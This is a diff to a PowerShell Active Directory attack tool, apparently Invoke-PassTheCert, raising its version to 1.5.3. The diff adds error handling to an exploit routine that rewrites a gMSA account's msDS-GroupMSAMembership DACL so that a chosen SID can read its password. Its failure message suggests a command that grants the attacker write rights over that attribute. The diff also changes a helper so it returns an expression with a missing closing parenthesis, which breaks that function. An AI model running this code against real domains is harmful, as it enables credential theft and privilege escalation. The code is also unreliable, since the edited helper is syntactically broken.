@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______| "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|          "
     Write-Host -ForegroundColor Red     ""
-    Write-Host -ForegroundColor Red     "   v1.5.2 "
+    Write-Host -ForegroundColor Red     "   v1.5.3 "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _     "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |    "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_   "
@@ -6876,7 +6876,7 @@ function _GetSubjectDNFromLdapConnection {
         [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection
     )
     
-    return ($LdapConnection.ClientCertificates.Subject) -replace ' ',''
+    return ($LdapConnection.ClientCertificates.Subject
 }
 
 
@@ -11628,40 +11628,51 @@ function _LDAPExploit {
 
             Write-Verbose "[*$Exploit*] [*] Allowing '$gMSAMembershipSID' To Read The Password Of gMSA Account '$TargetDN'..."
             
-            # Adding a new msDS-GroupMSAMembership's DACL
-            $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'msDS-GroupMSAMembership'
-            $SD.DiscretionaryAcl.InsertAce(
-                0,
-                (New-Object System.Security.AccessControl.ObjectAce(
-                    $SD.DiscretionaryAcl[0].AceFlags,
-                    $SD.DiscretionaryAcl[0].AceQualifier,
-                    $SD.DiscretionaryAcl[0].AccessMask,
-                    [System.Security.Principal.SecurityIdentifier]$gMSAMembershipSID,
-                    [System.Security.AccessControl.ObjectAceFlags]::None,
-                    [Guid]::Empty,
-                    [Guid]::Empty,
-                    [bool]$false,
-                    [byte[]]$null
-                ))
-            )
+            try {
+                
+                # Adding a new msDS-GroupMSAMembership's DACL
+                $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'msDS-GroupMSAMembership'
+                $SD.DiscretionaryAcl.InsertAce(
+                    0,
+                    (New-Object System.Security.AccessControl.ObjectAce(
+                        $SD.DiscretionaryAcl[0].AceFlags,
+                        $SD.DiscretionaryAcl[0].AceQualifier,
+                        $SD.DiscretionaryAcl[0].AccessMask,
+                        [System.Security.Principal.SecurityIdentifier]$gMSAMembershipSID,
+                        [System.Security.AccessControl.ObjectAceFlags]::None,
+                        [Guid]::Empty,
+                        [Guid]::Empty,
+                        [bool]$false,
+                        [byte[]]$null
+                    ))
+                )
 
-            # Removing the previous ACE (now at index 1)
-            $SD.DiscretionaryAcl.RemoveAce(1) |Out-Null
-            
-            # Inserting the newly defined msDS-GroupMSAMembership's DACL
-            $NewSD = New-Object byte[] $SD.BinaryLength
-            $SD.GetBinaryForm($NewSD, 0)
-            $LdapConnection.SendRequest(
-                (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-                    $TargetDN,
-                    [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
-                    'msDS-GroupMSAMembership',
-                    $NewSD
-                ))
-            ) |Out-Null
+                # Removing the previous ACE (now at index 1)
+                $SD.DiscretionaryAcl.RemoveAce(1) |Out-Null
+                
+                # Inserting the newly defined msDS-GroupMSAMembership's DACL
+                $NewSD = New-Object byte[] $SD.BinaryLength
+                $SD.GetBinaryForm($NewSD, 0)
+                $LdapConnection.SendRequest(
+                    (New-Object System.DirectoryServices.Protocols.ModifyRequest(
+                        $TargetDN,
+                        [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
+                        'msDS-GroupMSAMembership',
+                        $NewSD
+                    ))
+                ) |Out-Null
 
-            Write-Host "[*$Exploit*] [+] Successfully Allowed '$gMSAMembershipSID' To Read The Password Of gMSA Account '$TargetDN' !"
-            Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'gMSA' -Object '$TargetDN'"
+                Write-Host "[*$Exploit*] [+] Successfully Allowed '$gMSAMembershipSID' To Read The Password Of gMSA Account '$TargetDN' !"
+                Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'gMSA' -Object '$TargetDN'"
+
+            } catch {
+
+                Write-Host "[*$Exploit*] [!] Exploitation Failed With Error: $_"; 
+                Write-Host "[*$Exploit*] [*] Hint: Do You Have Write Privileges Against The '$TargetDN':'msDS-GroupMSAMembership' Attribute ? If Not, You May Execute (If Allowed):"
+                Write-Host "[*$Exploit*] [Fix] Invoke-PassTheCert -Action 'CreateInboundSDDL' -LdapConnection `$LdapConnection -Identity '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)' -Target '$TargetDN' -Attribute 'msDS-GroupMSAMembership' -SDDLACEType 'OA' -SDDLACERights 'RPWP'"
+                return
+
+            }
 
         }
 
